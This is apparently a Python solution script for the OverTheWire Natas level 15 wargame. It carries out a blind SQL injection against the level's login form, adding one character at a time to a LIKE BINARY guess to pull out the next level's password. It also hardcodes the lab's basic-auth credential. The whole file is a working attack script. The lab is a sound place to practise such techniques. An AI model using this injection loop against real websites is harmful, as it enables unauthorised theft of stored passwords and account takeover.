#!/usr/bin/env python3
import requests
import string
import sys
from requests.auth import HTTPBasicAuth

url = "http://natas15.natas.labs.overthewire.org/index.php"
auth = HTTPBasicAuth('natas15','AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
characters = string.ascii_letters + string.digits
username = ""

while True:
    for c in characters:
        payload = f'natas16" AND password LIKE BINARY "{username + c}%";-- -'
        data = {"username":payload}
        
        print(f"Trying... {payload}")

        r = requests.post(url,data=data,auth=auth)

        if ("This user exists." in r.text):
            username = username + c
            break
        elif (c == '9'):
            print(f"Username: {username}")
            sys.exit()